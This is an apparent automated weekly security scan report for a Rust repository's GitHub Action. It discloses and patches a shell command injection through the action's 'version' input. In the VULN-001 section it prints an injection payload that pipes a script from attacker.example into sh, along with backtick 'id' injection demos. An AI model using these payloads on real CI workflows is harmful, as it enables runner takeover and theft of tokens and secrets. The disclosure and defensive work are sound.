# Security Scan Report

**Generated:** 2026-11-16
**Scan Type:** Weekly Scheduled
**Repository:** EffortlessMetrics/tokmd-swarm
**Severity Threshold:** medium
**Intended Window:** 2026-11-09 → 2026-11-16
**Observed Scope:** Checked-out commit `07d878b`. `git log --since="7 days ago"`
reported **zero** commits in this checkout for the intended window; the most
recent commit on `main` is dated 2026-10-26, 21 days before the scan date.
The scan does not independently prove window completeness: the appendix records
a `git fetch --unshallow origin` performed before the scan, so the zero-commit
tally is limited to the observed checkout and must not be read as a
full-history claim.

To close the coverage gap this report also reviews the **adjacent interval**
2026-10-04 → 2026-10-26, which no prior report in this repository has
reviewed. The prior report (`2026-08-31`) covered through 2026-08-22 and
explicitly recorded a coverage gap for six adjacent commits.

## Executive Summary

| Severity | Count | Auto-fixed | Manual Required |
|----------|-------|------------|-----------------|
| CRITICAL | 0 | 0 | 0 |
| HIGH | 1 | 1 | 0 |
| MEDIUM | 0 | 0 | 0 |
| LOW | 0 | 0 | 0 |

**Total Findings:** 1
**Auto-fixed:** 1
**Manual Review Required:** 0

**Evidence limitation:** No automated vulnerability scanner, SAST tool, or
heavyweight build/test witness ran in this environment. This is an advisory
zero-finding tally from manual review with a source-level regression test, not
a security pass and not evidence that the repository has no vulnerabilities.

**Summary:** One HIGH finding — shell command injection through the composite
GitHub Action's `version` input — was confirmed, patched, and covered by a new
regression test. The finding sits in `action.yml`, the highest-privilege
distribution surface in the repository. The specific defect is that
`action.yml` interpolated `${{ inputs.version }}` **directly into a `run:`
script body**. GitHub Actions performs textual substitution of `${{ ... }}`
expressions *before* the shell parses the script, so a value containing a
double quote breaks out of the intended quoting and executes attacker-chosen
commands on the runner.

No new trust boundary, subprocess surface, secret/env surface, schema bump,
CLI flag, or dependency change was introduced by the reviewed commits. Every
other reviewed change is STRIDE-positive (risk-reducing) or STRIDE-neutral.

The threat model at `.factory/threat-model/threat-model.md` was 106 days old,
past the 90-day regeneration window, so it was regenerated in this scan.

## High Findings

### VULN-001: Shell command injection via GitHub Action `version` input

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **STRIDE Category** | Elevation of Privilege / Tampering |
| **CWE** | CWE-78 (OS Command Injection) |
| **File** | `action.yml:222` (pre-fix) |
| **Status** | Patched |

**Description:**

`action.yml` is the repository's published composite GitHub Action. Its
"Install tokmd" step read the caller-supplied `version` input like this:

```yaml
        version="${{ inputs.version }}"
```

GitHub Actions substitutes `${{ ... }}` expressions **textually** into a `run:`
script body before the shell parses it. It does not shell-escape the value.
The surrounding double quotes therefore provide no protection: a `version`
value containing `"` terminates the assignment and the remainder of the value
is parsed as shell syntax.

The same step already bound the identical value safely in its `env:` block
(`TOKMD_ACTION_VERSION: ${{ inputs.version }}`), which shows the intended
pattern was known but not applied consistently. Two further sites had the same
defect: `${{ inputs.artifact }}` and `${{ inputs.comment }}` were interpolated
into a `run:` body at lines 806-807, inside a backtick command-substitution
context.

**Reachability:** The "Install tokmd" step has no `if:` condition, so it runs
on every invocation of the action. The vulnerable assignment is reached
whenever `tokmd` is not already on `PATH` (the normal case, since the step
exists to install it). The "Publish workflow summary" step has `if: always()`,
so lines 806-807 are always reached.

**Exploitability:** Trivial. The payload requires no special characters beyond
a double quote and a shell metacharacter, and no timing or race condition:

```
version: '1.15.0"; curl -sSf https://attacker.example/p | sh; #'
```

A consuming workflow that forwards any PR-controlled or dispatch-controlled
value into `version` — for example `version: ${{ github.event.pull_request.title }}`
— turns this into arbitrary command execution on the runner, with the
repository's `GITHUB_TOKEN` and any workflow `secrets.*` in scope. The action's
own documentation only shows literal version strings, so the vulnerable
pattern requires a consuming workflow to interpolate a dynamic value; that
pattern is common in real workflows and is not documented as forbidden.

**Impact:** Arbitrary command execution on a GitHub Actions runner. At minimum
this means source-tree tampering, receipt/artifact forgery, and exfiltration of
`GITHUB_TOKEN` and repository secrets. The action runs `tokmd` against the
checked-out repository and posts PR comments, so a forged receipt or a
tampered manifest would defeat the review-evidence contract the action exists
to provide.

**Why HIGH and not CRITICAL:** The vulnerable value must be supplied by the
consuming workflow, and the documented invocation patterns use literal version
strings, so exploitation requires a workflow author to forward a dynamic value
into `version`. It is not exploitable by an unauthenticated remote party
against this repository alone, and it does not by itself grant access to
`main`.

**Evidence (pre-fix):**

```yaml
# action.yml, "Install tokmd" step
      env:
        TOKMD_ACTION_RUNTIME: ${{ inputs.runtime }}
        TOKMD_ACTION_IMAGE: ${{ inputs.image }}
        TOKMD_ACTION_VERSION: ${{ inputs.version }}   # safe: env binding
      run: |
        ...
        version="${{ inputs.version }}"                # unsafe: interpolated into run body
```

Rendered script for the payload `1.15.0"; echo INJECTED; #`:

```console
$ python3 -c '...'   # simulates GitHub Actions textual substitution
--- rendered script ---
version="1.15.0"; echo INJECTED; #"
echo "resolved version: $version"
--- executing ---
INJECTED
resolved version: 1.15.0
```

Backtick-context injection at the summary sites was confirmed independently:

```console
$ bash -c 'echo "- Artifact upload enabled: `id > /tmp/pwned_806`"'
- Artifact upload enabled:
uid=1001(runner) gid=1001(runner) groups=1001(runner),4(adm),100(users),113(docker),999(systemd-journal)
```

`SECURITY.md` names "Command injection: Unsanitized input passed to shell
commands or external processes" as a security vulnerability for tokmd, so this
is in scope for the project by its own stated policy.

**Fix Applied:**

```diff
--- a/action.yml
+++ b/action.yml
@@ -219,7 +219,21 @@
           exit 0
         fi

-        version="${{ inputs.version }}"
+        # Read the version from the environment, never by interpolating the
+        # expression into this script body: GitHub Actions substitutes
+        # `${{ ... }}` textually before the shell parses it, so a value
+        # containing a quote would break out of the assignment and execute
+        # attacker-chosen commands on the runner.
+        version="${TOKMD_ACTION_VERSION-}"
+        # Only a literal release tag may reach the download URL. Reject
+        # anything else before it is used to build a URL or a path. The
+        # pattern is anchored to a fixed character class so shell
+        # metacharacters cannot survive into the URL.
+        if [ -z "$version" ]; then
+          version="latest"
+        elif [ "$version" != "latest" ]; then
+          if ! printf '%s' "$version" | grep -Eq '^v?[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "::error::version must be 'latest' or a MAJOR.MINOR.PATCH release tag; received '$version'"
+            exit 1
+          fi
+        fi
         os="${RUNNER_OS}"
         arch="${RUNNER_ARCH:-X64}"

@@ -775,6 +789,8 @@
         COMMAND_STATUS: ${{ steps.generate.outputs['command-status'] }}
+        ARTIFACT_ENABLED: ${{ inputs.artifact }}
+        COMMENT_ENABLED: ${{ inputs.comment }}
       run: |
         set -euo pipefail

@@ -803,8 +819,8 @@
           echo "| Sensor report | \`$(value_or_missing "$SENSOR_REPORT_FILE")\` |"
           echo "| Baseline report | \`$(value_or_missing "$BASELINE_REPORT_FILE")\` |"
           echo
-          echo "- Artifact upload enabled: \`${{ inputs.artifact }}\`"
-          echo "- PR comment enabled: \`${{ inputs.comment }}\`"
+          echo "- Artifact upload enabled: \`${ARTIFACT_ENABLED}\`"
+          echo "- PR comment enabled: \`${COMMENT_ENABLED}\`"
           echo "- Command exit status: \`$(value_or_missing "$COMMAND_STATUS")\`"
         } >> "$GITHUB_STEP_SUMMARY"
```

Two independent layers now apply:

1. **No expression injection.** `version`, `artifact`, and `comment` reach
   their script bodies only through `env:` bindings, so GitHub Actions never
   substitutes a caller-controlled value into shell source.
2. **Input validation.** The binary runtime validates `version` against
   `^v?[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$` (or the literal `latest`)
   before it is used to build a download URL. This matches the container
   runtime, which already gated `version` against an explicit allowlist
   (`container_supported_tags` at `action.yml:154`) — the default binary
   runtime path had no equivalent guard.

A side effect of the fix: an omitted or empty `version` now resolves to
`latest` instead of the pre-fix malformed tag `v`. The pre-fix behavior
produced the URL `.../releases/download/v/$asset`, which cannot resolve.

**Regression test added:** `scripts/ci_action_input_injection_test.py`
(6 tests, auto-discovered by the existing `python3 -m unittest discover -s
scripts -p 'ci_*_test.py'` invocation in `.github/workflows/ci.yml`). It:

- asserts no `inputs.*` expression appears in any `run:` body (this check
  fails against the pre-fix `action.yml` with all three offending lines
  reported);
- asserts every input is bound through an `env:` block;
- extracts the real validation block from `action.yml` and executes it against
  10 legitimate release tags (accepted) and 19 metacharacter payloads
  (rejected).

Verified behavior of the test:

- against the **patched** `action.yml`: 6 passed;
- against the **unpatched** `action.yml` (`git show HEAD:action.yml`): 3
  failures and 1 error, reporting `action.yml:222`, `action.yml:806`, and
  `action.yml:807`.

Full existing script suite after the change: **70 tests, all passing** (64
pre-existing + 6 new). `action.yml` was re-parsed with a YAML loader and the
step/`env:` structure was confirmed intact.

---

## Medium Findings

*None.*

## Low Findings

*None.*

## Observations (Below Threshold — Not Reported As Findings)

These items were considered during the scan but do not meet the `medium`
severity threshold. They are recorded here for traceability and the next
scheduled scan. Several are carried forward from the `2026-08-31` report.

### OBS-001 (carried): GitHub Actions pinning is mixed, not uniform

The `2026-08-31` report recorded a carried observation claiming the Droid
workflows and `actions/checkout` are SHA-pinned while other workflows mix
tags and SHAs. The 2026-11-16 regeneration of the threat model found that
standing defense 7 in `.factory/threat-model/threat-model.md` **overclaimed**
("All third-party actions pinned by SHA with a comment naming the upstream
version"). That text has been corrected in this scan to state the mixed
policy accurately.

Verified at commit `07d878b`:

- SHA-pinned: `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`
  and `EffortlessMetrics/droid-action-safe@7c1377ccbacddc95560d1570547a5baa51de01ec`
  across all three `droid*.yml` workflows; `actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a`
  and `thollander/actions-comment-pull-request@24bffb9b452ba05a4f3f77933840a6a841d1b32b`
  in `action.yml`.
- Still mutable tag/branch: `dtolnay/rust-toolchain@stable`,
  `Swatinem/rust-cache@v2`, `taiki-e/install-action@v2`,
  `actions/upload-artifact@v7.0.1`, `actions/setup-node@v7`,
  `actions/download-artifact@v8`, `actions/attest-build-provenance@v4`,
  `softprops/action-gh-release@v3`, `docker/setup-buildx-action@v4`,
  `docker/login-action@v4`, `docker/metadata-action@v6`,
  `docker/build-push-action@v7`, `DeterminateSystems/nix-installer-action@v22`,
  `DeterminateSystems/magic-nix-cache-action@v14`.

**Why not a finding:** The highest-privilege third-party surface (the custom
Droid action) is SHA-pinned, and the mutable references are widely used,
first-party-published actions rather than untrusted forks. A pin in one job
does not establish a repository-wide contract, but the residual risk is
supply-chain tampering of CI infrastructure, requiring a separate compromise
of an upstream action tag. Below the `medium` threshold for this scan.

**Recommended action (optional, future):** Convert the remaining references
to SHA pins and codify the rotation process in `.factory/rules/`.

### OBS-002 (carried): FFI JSON payload size not bounded

`crates/tokmd-core/src/ffi/mod.rs` accepts a JSON string of arbitrary size.
Individual `inputs[].path` is bounded to 4096 bytes
(`MAX_IN_MEMORY_INPUT_PATH_BYTES`), but the outer JSON envelope is not.

**Why not a finding:** Caller controls input. `serde_json::from_str` allocates
predictably; no algorithmic blowup. Requires the caller to opt in. Unchanged
in this scan's commits.

### OBS-003 (carried): Transitive `RUSTSEC-2020-0163` advisory

`term_size` is a transitive dependency of `tokei` with an unmaintained
advisory. It is already documented in `deny.toml` with a rationale. Out of
scope per `SECURITY.md`.

### OBS-004 (carried): `web/runner` browser code does not pin GitHub API base URL

`web/runner/ingest.js` hard-codes `api.github.com` fetch targets. The token
is held in `sessionStorage` (tab-scoped) and used as a `Bearer` header. No
Subresource Integrity pinning or origin allow-listing, but all dynamic data
is rendered via `textContent` with no `innerHTML`, `eval`, `new Function`, or
`document.write`. Below threshold; unchanged in this scan's commits.

### OBS-005 (carried): `action.yml` install step performs `curl | sh` style download

The composite Action downloads a pre-built `tokmd` binary and verifies it
against `checksums.txt` (sha256). It does not verify a cryptographic
signature on the checksum file or on the release itself, and the download URL
is interpolated from a user-supplied `version` input.

**Why not a finding:** The checksum comparison is enforced when
`checksums.txt` is present; build provenance is separately attested via
`actions/attest-build-provenance@v4` in `release.yml`; the container runtime
already gates `version` against an explicit allowlist. The pre-fix gap that
`version` was unvalidated in the binary runtime is now closed by VULN-001.
The residual gap — no signature over `checksums.txt` — is below threshold.

### OBS-006 (carried): Branch protection review requirements are zero

`.github/settings.yml` configures `required_approving_review_count: 0` and
`require_code_owner_reviews: false` for `main`, with only `Tokmd Rust Result`
as a required status context and `required_conversation_resolution: true`.
This is an explicit single-maintainer policy, documented in the file's own
comments. Live enforcement was not independently proven by this scan. Below
threshold.

### OBS-007 (new): Composite Action input values remain a workflow-level trust boundary

VULN-001 closed the *injection* path, but the Action still accepts
caller-controlled values for `version`, `paths`, `output-dir`, `base`, `head`,
`mode`, `preset`, and `image`. After the fix, `version` is validated and
`output-dir` is rejected when absolute or when it contains a `..` segment, but
`base` and `head` are passed to `tokmd` as git refs and `paths` selects scan
roots.

**Why not a finding:** `base`/`head` reach `tokmd`'s own git-ref validation
(`tokmd-git/src/refs.rs::env_base_ref_is_safe` plus `--end-of-options`), and
`paths` reaches the bounded-path layer. The residual risk is that a consuming
workflow that forwards attacker-controlled values still delegates the trust
decision to the workflow author. This is an inherent property of a
composite action, not a defect in the manifest.

**Recommended action (optional, future):** Document in `docs/github-action.md`
that `version` must be a literal release tag and that dynamic inputs should
not be forwarded from PR-controlled data.

## Adjacent Interval Review (2026-10-04 → 2026-10-26)

The strict 7-day window contained zero commits. To avoid an unverified
zero-finding claim, the scan reviewed the adjacent interval that no prior
report covers. Each commit below was reviewed for new trust boundaries, new
subprocess surfaces, new secret/env handling, new deserialization, new path
handling, new dependencies, new schema bumps, new CLI flags, and new release
surface.

| Commit | Date | Subject | Files | Verdict |
|--------|------|---------|-------|---------|
| `07d878b` | 2026-10-26 | fix(ci): retain renamed paths in affected selectors (#771) | 6 | STRIDE-positive |
| `e79d82d9` | 2026-10-26 | fix(gate): preserve other runs' target directories (#770) | 7 | STRIDE-positive |
| `3e3dc2e0` | 2026-10-26 | docs: clarify same-session review and evidence reuse (#769) | 3 | STRIDE-neutral (docs only) |
| `46b8963c` | 2026-10-17 | fix(ci): require exact qualification requests and share work deadline (#737) | — | STRIDE-neutral |
| `33f6f232` | 2026-10-17 | fix(context): explain empty selections and budget recovery (#732) | — | STRIDE-neutral |
| `83078a81` | 2026-10-17 | perf(format): format HTML rows into a preallocated buffer (#733) | — | STRIDE-positive (DoS) |
| `0aa2dd06` | 2026-10-17 | fix(deps): upgrade ZIP to 9.0.5 with archive regressions (#735) | 5 | STRIDE-positive |
| `d35f968e` | 2026-10-16 | fix(gate): propagate JSON stdout I/O failures (#723) | — | STRIDE-positive |
| `92122cbf` | 2026-10-16 | fix(git): reap history children on limits and read errors (#724) | 2 | STRIDE-positive (DoS) |
| `f490b40c` | 2026-10-16 | fix(cli): treat explicit command paths as inputs during recovery (#719) | — | STRIDE-positive |
| `12164b70` | 2026-10-16 | fix(analysis): stabilize integrity hashes for colon-prefixed paths | — | STRIDE-positive |
| `873442d7` | 2026-10-14 | fix(diff): keep Git worktree chatter out of report stdout (#717) | — | STRIDE-positive |
| `c8c34fe3` | 2026-10-14 | fix(tools): return stdout errors without panicking (#715) | — | STRIDE-positive |
| `10e51f92` | 2026-10-13 | fix(check-ignore): preserve Git unignore decisions (#713) | — | STRIDE-neutral |
| `93e1ce27` | 2026-10-11 | fix(config): expose failed legacy JSON sources for recovery (#708) | — | STRIDE-positive |
| `bf4a1f0d` | 2026-10-11 | fix(cli): reject unmatched selected profiles before receipts (#706) | — | STRIDE-positive |
| `6e0122ae` | 2026-10-11 | test(context): preserve required-read path identities on Windows (#704) | — | Test-only |
| `44a3bd6a` | 2026-10-10 | fix(scan): reject incomplete reads before complete receipts (#702) | — | STRIDE-positive |
| `7bc1d669` | 2026-10-10 | perf(scan): skip byte-identical canonical report rebasing (#700) | — | STRIDE-positive |
| `5726ac68` | 2026-10-10 | docs(first-use): gate saved analysis metrics instead of manifest (#701) | — | STRIDE-neutral (docs only) |
| `fbf99ed1` | 2026-10-10 | fix(context): bound HeadTail bytes and retained memory (#695) | — | STRIDE-positive (DoS) |
| `bfb509d7` | 2026-10-10 | fix(ci): write usable observability clock markers (#694) | — | STRIDE-neutral |
| `33c44b02` | 2026-10-10 | fix(bundle): fail required selected input reads (#693) | — | STRIDE-positive |
| `40bb56cf` | 2026-10-10 | fix(release): fail closed on contradictory consumer evidence (#683) | — | STRIDE-positive |
| `5f5ca66c` | 2026-10-08 | fix(proof): map run_diff into CLI scope (#669) | — | STRIDE-neutral |
| `38b58995` | 2026-10-08 | fix(run): exclude retained output artifacts from scans (#666) | 7 | STRIDE-positive |
| `31f16b7d` | 2026-10-08 | fix(cli): report invalid selected lang profile format (#665) | — | STRIDE-neutral |
| `507dc4fa` | 2026-10-07 | fix(cli): recover file-valued handoff output path (#664) | — | STRIDE-positive |
| `f3404c29` | 2026-10-07 | fix(cli): recover export output path errors (#663) | — | STRIDE-positive |
| `89df0882` | 2026-10-07 | fix(cli): align Run and Render analysis feature guards (#662) | — | STRIDE-neutral |
| `4c0bd3f9` | 2026-10-07 | fix(cli): select recovery before pathname heuristics (#661) | — | STRIDE-positive |
| `bd965f97` | 2026-10-07 | fix(cli): recover directory baselines with file-selection guidance (#660) | — | STRIDE-positive |
| `06657cf0` | 2026-10-07 | fix(cli): recover corrupt UTF-8 baselines without keyword advice (#659) | — | STRIDE-positive |
| `038d017e` | 2026-10-06 | fix(context): preserve head-tail I/O causes (#657) | — | STRIDE-neutral |
| `8e734bff` | 2026-10-06 | fix(cli): keep check-ignore path failures local (#656) | — | STRIDE-positive |
| `fe37ac6a` | 2026-10-06 | fix(proof): require and route CLI recovery evidence (#655) | — | STRIDE-positive |
| `b6cec604` | 2026-10-06 | fix(cli): keep local file paths out of network recovery hints (#654) | 3 | STRIDE-positive |
| `abd89cf5` | 2026-10-06 | fix(cli): preserve parser recovery and gate error causes (#653) | — | STRIDE-positive |
| `652ed4ca` | 2026-10-06 | fix(cli): give missing files and output directories actionable recovery (#652) | — | STRIDE-positive |
| `93dc2b91` | 2026-10-04 | docs(cli): clarify scan and TOML config selectors (#649) | — | STRIDE-neutral (docs only) |
| `8358a091` | 2026-10-04 | fix(tokmd): report invalid selected TOML config (#648) | — | STRIDE-neutral |

### Notable reviewed changes in detail

- **`e79d82d9 fix(gate): preserve other runs' target directories (#770)`** —
  STRIDE-positive for Tampering / Denial of Service. This commit **removed**
  a destructive cross-run cleanup: the CI workflow previously ran
  `find /tmp -maxdepth 1 -type d -name 'tokmd-gate-target-*' -mmin +30 -exec rm -rf {} +`,
  and `xtask/src/tasks/build_guard.rs` had an age-gated
  `cleanup_stale_scoped_dirs` that called `remove_dir_all` on any matching
  directory under the system temp dir. Both were removed. The prior behavior
  could delete an *active* sibling run's target directory, because directory
  age does not distinguish an abandoned target from a running one. The commit
  retains the disk-pressure refusal (`ensure_min_free_space`) and its
  floor/override. New tests in `scripts/ci_budget_test.py` and
  `xtask/tests/required_gate_locked_commands_w108.rs` intercept `find`/`rm`
  and assert no cross-run cleanup occurs.

- **`07d878b fix(ci): retain renamed paths in affected selectors (#771)`** —
  STRIDE-positive for Tampering / Information Disclosure. `xtask/src/tasks/affected.rs`
  and `xtask/src/tasks/ci_plan.rs` changed `git diff --name-only` to
  `git diff --no-renames --name-only -z` with NUL framing. This prevents a
  filename containing a newline from being split into multiple paths, and
  keeps both endpoints of a rename visible so a removed path cannot silently
  drop out of the affected-selector policy (which is fail-closed by design).
  The commit also replaced `normalize_path` (which replaced `\` with `/`) so
  a literal backslash in a Git filename is preserved for matching, and added
  `escape_debug()` to dynamic fields in the human affected report.

- **`92122cbf fix(git): reap history children on limits and read errors (#724)`** —
  STRIDE-positive for Denial of Service. `crates/tokmd-git/src/lib.rs`
  previously dropped the `Child` handle without killing or waiting on the
  stdout-read-error path, and waited for the full history on the early-limit
  path. The commit adds a `HistoryChild` guard that terminates and reaps the
  direct `git log` child on both paths, so an aborted scan no longer leaks a
  subprocess. The only `sh -c` invocation in the crate is inside
  `#[cfg(all(test, unix))]` test fixtures.

- **`0aa2dd06 fix(deps): upgrade ZIP to 9.0.5 with archive regressions (#735)`** —
  STRIDE-positive. `crates/tokmd-io-port/src/archive.rs` decodes archives
  fully in memory and never extracts them. The commit adds regression tests
  confirming that (a) symlink entries pointing outside the root are rejected
  as `NonRegularEntry` without touching host files, (b) privileged Unix mode
  bits stay in memory and do not alter host file permissions, and (c) an
  archive whose headers understate the inflated size is rejected as
  `MalformedArchive`.

- **`b6cec604 fix(cli): keep local file paths out of network recovery hints (#654)`** —
  STRIDE-positive for Information Disclosure. `crates/tokmd/src/error_hints.rs`
  now classifies stable local file failures (typed `NotFound` /
  `PermissionDenied` causes plus producer context, or explicit path markers)
  *before* matching text-only remote-service recovery hints, so a local path
  containing a keyword such as `rate limit` no longer produces a network
  recovery suggestion.

- **`f29af346 fix(core): reject malformed JSON diff inputs (#583)`** —
  STRIDE-positive for fail-closed behavior. `crates/tokmd-core/src/workflows/diff.rs`
  previously discarded a `LangReceipt` parse error for every existing file and
  then scanned the file as source. The commit makes the exact case-sensitive
  canonical basename `lang.json` fail closed with path and serde context,
  while other JSON files remain source-scan candidates.

### Standing defenses re-verified at commit `07d878b`

Read in place during this scan; no regressions observed.

| Defense | Location | Status |
|---------|----------|--------|
| Git subprocess env isolation | `crates/tokmd-git/src/command.rs` (`GIT_REPO_SHAPING_ENV`), `crates/tokmd-scan/src/walk/git.rs`, `crates/tokmd/src/git_support.rs` | Present |
| Git ref-name validation + `--end-of-options` | `crates/tokmd-git/src/refs.rs::env_base_ref_is_safe` | Present |
| FFI in-memory path validation | `crates/tokmd-core/src/ffi/inputs.rs` | Present |
| Strict FFI JSON decoding | `crates/tokmd-core/src/ffi/parse.rs`, `ffi/mod.rs` | Present |
| Bounded path canonicalization | `crates/tokmd-scan/src/path/bounded_path.rs` | Present |
| Redaction hashing (BLAKE3, extension allowlist) | `crates/tokmd-format/src/redact/mod.rs` | Present |
| Content read limits | `crates/tokmd-analysis/src/content/mod.rs` (`DEFAULT_MAX_FILE_BYTES = 128 KiB`) | Present |
| Fail-closed `cargo audit` gate | `crates/tokmd-cockpit/src/supply_chain.rs` | Present |
| RFC 6901 pointer evaluation | `crates/tokmd-gate/src/pointer.rs` | Present |
| Action `output-dir` rejection (absolute, `..`) | `action.yml` | Present |
| Action input env-binding (new this scan) | `action.yml`, `scripts/ci_action_input_injection_test.py` | Present (added) |
| Action version format validation (new this scan) | `action.yml` | Present (added) |
| Droid action SHA pinning | `.github/workflows/droid*.yml` | Present |
| Advisory posture | `deny.toml` (`RUSTSEC-2020-0163` ignored with rationale) | Present |
| Schema versioning | `tokmd-types`, `tokmd-analysis-types` (`SCHEMA_VERSION=2`, `COCKPIT=3`, `HANDOFF=5`, `CONTEXT=4`, `CONTEXT_BUNDLE=2`, `ANALYSIS=9`) | Unchanged |
| `sh -c` usage | `crates/tokmd-git/src/lib.rs:423` | Test-only (`#[cfg(all(test, unix))]`) |

## Patches Generated

One patch was generated and applied this scan:

- **VULN-001** — `action.yml`: moved `version`, `artifact`, and `comment` out of
  `run:` bodies into `env:` bindings; added strict release-tag validation for
  `version` in the binary runtime path. Committed as
  `fix(security): [VULN-001] Remove GitHub Action input expression injection`.

Regression coverage added: `scripts/ci_action_input_injection_test.py`
(6 tests). Verified to fail against the pre-fix manifest and pass against the
patched manifest.

## Next Scan

The next scheduled security scan runs Monday, 2026-11-23 via
`.github/workflows/droid-security-scan.yml` (cron `0 8 * * 1`).

## Appendix

### Threat Model

- **Status:** Regenerated (was 106 days old, past the 90-day window).
- **Location:** `.factory/threat-model/threat-model.md`
- **Previous review:** 2026-08-02
- **This review:** 2026-11-16
- **Methodology:** STRIDE
- **Changes:** Added trust boundaries TB-11 and TB-12 for the composite Action
  surface; added Spoofing, Tampering, and Elevation of Privilege rows for
  Action input handling; corrected standing defense 7, which had overclaimed
  uniform SHA pinning of all third-party actions.

### Scan Metadata

- **Strict window:** 2026-11-09 → 2026-11-16 — zero commits in the observed
  checkout.
- **Adjacent interval reviewed:** 2026-10-04 → 2026-10-26 — 41 commits, listed
  individually above.
- **Known commit reviewed (most recent on `main`):**
  `07d878beee199568dbfa7698686ca1999addb7c8 fix(ci): retain renamed paths in
  affected selectors (#771)`, 2026-10-26.
- **Window completeness:** Not independently proven. `git log --since="7 days
  ago"` returned zero commits in the observed checkout. A
  `git fetch --unshallow origin` was performed before the scan (history went
  from 1 to 2325 commits), which materially improves confidence that the
  window is genuinely empty, but the fetch is still bounded and does not
  constitute a full-history proof.
- **Findings by file:** VULN-001 in `action.yml` (lines 222, 806, 807
  pre-fix). No other file produced a finding at or above `medium`.
- **Files changed by this scan:** `action.yml` (fix),
  `scripts/ci_action_input_injection_test.py` (new regression test),
  `.factory/threat-model/threat-model.md` (regenerated),
  `.factory/security/reports/security-report-2026-11-16.md` (this report).
- **Validation performed:**
  - `python3 -m unittest discover -s scripts -p 'ci_action_input_injection_test.py'`
    → 6 passed.
  - Same test against `git show HEAD:action.yml` → 3 failures + 1 error,
    correctly reporting all three vulnerable lines (RED control).
  - `python3 -m unittest discover -s scripts -p 'ci_*_test.py'` → 70 tests, all
    passing.
  - `action.yml` re-parsed with a YAML loader; step and `env:` structure
    confirmed intact.
  - Direct shell-level injection demonstrations run before and after the fix.
- **Not performed:** No `cargo build`, `cargo test`, `cargo clippy`, or
  `cargo xtask gate --check` run in this environment; the change is confined
  to `action.yml` and a Python test, and does not touch Rust sources, so the
  Rust toolchain gate is unaffected but was not executed here.
- **Scan Duration:** ~45m
- **Skills Used:** threat-model-generation (manual, STRIDE),
  commit-security-scan (manual, STRIDE), vulnerability-validation (manual,
  reachability/exploitability/impact assessment), security-review (manual,
  patch generation)
- **Manual Reviewers:** 1 (Droid scheduled security scan)
- **False Positive Filter:** applied — the version-validation fix was
  re-tested against 10 legitimate release tags and 19 metacharacter payloads
  after an initial permissive glob was rejected as insufficiently strict

### References

- [CWE Database](https://cwe.mitre.org/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [STRIDE Threat Model](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [GitHub Actions: Script injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [Rust Security Advisory Database](https://rustsec.org/)
- [CII Best Practices](https://www.bestpractices.dev/)
- Repository security policy: `SECURITY.md`
- Repository threat model: `.factory/threat-model/threat-model.md`
- Previous scans: `.factory/security/reports/security-report-2026-06-01.md`,
  `.factory/security/reports/security-report-2026-06-08.md`,
  `.factory/security/reports/security-report-2026-06-29.md`,
  `.factory/security/reports/security-report-2026-07-06.md`,
  `.factory/security/reports/security-report-2026-07-13.md`,
  `.factory/security/reports/security-report-2026-07-20.md`,
  `.factory/security/reports/security-report-2026-07-27.md`,
  `.factory/security/reports/security-report-2026-08-03.md`,
  `.factory/security/reports/security-report-2026-08-10.md`,
  `.factory/security/reports/security-report-2026-08-17.md`,
  `.factory/security/reports/security-report-2026-08-31.md`
